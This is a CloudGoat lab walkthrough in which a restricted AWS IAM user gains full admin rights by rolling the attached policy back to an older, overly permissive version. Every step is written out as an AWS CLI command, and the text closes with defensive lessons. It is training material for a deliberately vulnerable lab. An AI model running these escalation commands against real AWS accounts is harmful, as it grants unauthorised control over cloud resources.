# Scenario: iam_privesc_by_rollback

In this CloudGoat scenario, we'll find how a highly-limited IAM user can exploit an AWS policy misconfiguration to gain full administrative privileges. This is achieved by rolling back an IAM policy to a previous version that grants full access rights. The goal is to understand the risks associated with improperly managed IAM policies and how attackers can exploit such vulnerabilities to escalate privileges.

### Scenario Summary
- **Scenario Size:** Small
- **Difficulty:** Easy
- **Starting Point:** IAM User named "Raynor"
- **Goal:** Acquire full admin privileges

In this walkthrough, you will:
1. Analyze the permissions of the limited IAM user "Raynor."
2. Review previous versions of the attached policy.
3. Restore an older policy version that grants full admin privileges.

### AWS Concepts to Know
Before diving in, let's briefly discuss some important AWS terms used in this scenario:
- **IAM User:** An IAM user is an identity that you create in AWS to interact with resources. In this scenario, the user "Raynor" has highly restricted permissions.
- **IAM Policy:** Policies define permissions for IAM users or roles. AWS allows policies to have multiple versions, but only one can be the active default version at any time.
- **SetDefaultPolicyVersion:** This permission allows a user to switch the default version of a policy to any of the available versions, potentially leading to privilege escalation if older versions have overly permissive rules.

### Step-by-Step Walkthrough

#### Step 1: Create the Scenario
First, we create the scenario using the CloudGoat tool, which sets up the environment for us.

```bash
~/cloudgoat$ ./cloudgoat.py create iam_privesc_by_rollback
```
This command will output the access key and secret key for the IAM user "Raynor".

```plaintext
cloudgoat_output_raynor_access_key_id = AK
cloudgoat_output_raynor_secret_key = zn
```

#### Step 2: Configure AWS Profile for User "Raynor"
We start by configuring the AWS CLI to use credentials for the user "Raynor". This allows us to interact with AWS services using Raynor's limited permissions.

```bash
~/cloudgoat$ aws configure --profile raynor
AWS Access Key ID [None]: AK
AWS Secret Access Key [None]: zn+
Default region name [None]: 
Default output format [None]:
```

#### Step 3: List Attached Policies for Raynor
Using the AWS CLI, we list all the policies attached to the IAM user "Raynor" to understand what actions can be performed.

```bash
~/cloudgoat$ aws --profile raynor iam list-attached-user-policies --user-name raynor-iam_privesc_by_rollback_cgid6qy1h0boey
```
The output shows that there is one policy attached to Raynor:

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "cg-raynor-policy-iam_privesc_by_rollback_cgid6qy1h0boey",
            "PolicyArn": "arn:aws:iam::997581282912:policy/cg-raynor-policy-iam_privesc_by_rollback_cgid6qy1h0boey"
        }
    ]
}
```

#### Step 4: Get Policy Details
We retrieve details about the attached policy to understand its current version and permissions.

```bash
~/cloudgoat$ aws --profile raynor iam get-policy --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-iam_privesc_by_rollback_cgid6qy1h0boey
```
The output shows that the default version of the policy is **v1**.

#### Step 5: List All Policy Versions
AWS allows policies to have multiple versions, and only one can be the default version at any given time. We list all versions of the attached policy to see if there is any version that grants more permissions.

```bash
~/cloudgoat$ aws --profile raynor iam list-policy-versions --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-iam_privesc_by_rollback_cgid6qy1h0boey
```
The output shows that there are multiple versions of this policy, from **v1** to **v5**.

#### Step 6: Analyze Older Policy Versions
We retrieve details of each older version to understand their permissions.

- **Version v5**: Allows limited access to IAM resources based on time conditions.

```bash
~/cloudgoat$ aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-iam_privesc_by_rollback_cgid6qy1h0boey --version-id v5
```
- **Version v4**: Grants read-only access to Amazon S3.

```bash
~/cloudgoat$ aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-iam_privesc_by_rollback_cgid6qy1h0boey --version-id v4
```
- **Version v3**: Grants full administrative privileges, allowing any action on any resource.

```bash
~/cloudgoat$ aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-iam_privesc_by_rollback_cgid6qy1h0boey --version-id v3
```
- **Version v2**: Contains a deny policy based on IP address conditions.

```bash
~/cloudgoat$ aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-iam_privesc_by_rollback_cgid6qy1h0boey --version-id v2
```

#### Step 7: Set Default Policy Version to v3
After reviewing the policy versions, we find that version **v3** grants full administrative privileges. We use the **SetDefaultPolicyVersion** permission to switch the default policy version to **v3**.

```bash
~/cloudgoat$ aws --profile raynor iam set-default-policy-version --policy-arn arn:aws:iam::997581282912:policy/cg-raynor-policy-iam_privesc_by_rollback_cgid6qy1h0boey --version-id v3
```
With this command, Raynor now has full admin privileges and can perform any action within the AWS account.

#### Step 8: Verify Admin Privileges
We can verify that Raynor now has full administrative privileges by attempting an action that requires elevated permissions, such as listing all S3 buckets.

```bash
~/cloudgoat$ aws --profile raynor s3 ls
```
The command succeeds, indicating that Raynor now has full access.

#### Step 9: Destroy the Scenario
After completing the scenario, we destroy the environment to clean up the resources.

```bash
~/cloudgoat$ ./cloudgoat.py destroy iam_privesc_by_rollback_cgid6qy1h0boey/
```

### Conclusion
In this scenario, we demonstrated how a limited IAM user could escalate privileges by exploiting the **SetDefaultPolicyVersion** permission. By reverting to an older policy version with full admin rights, the user was able to gain complete control over the AWS account.

Key lessons from this scenario include understanding the importance of restricting access to policy version management and ensuring that old, overly permissive policy versions are deleted or properly controlled to prevent privilege escalation attacks.
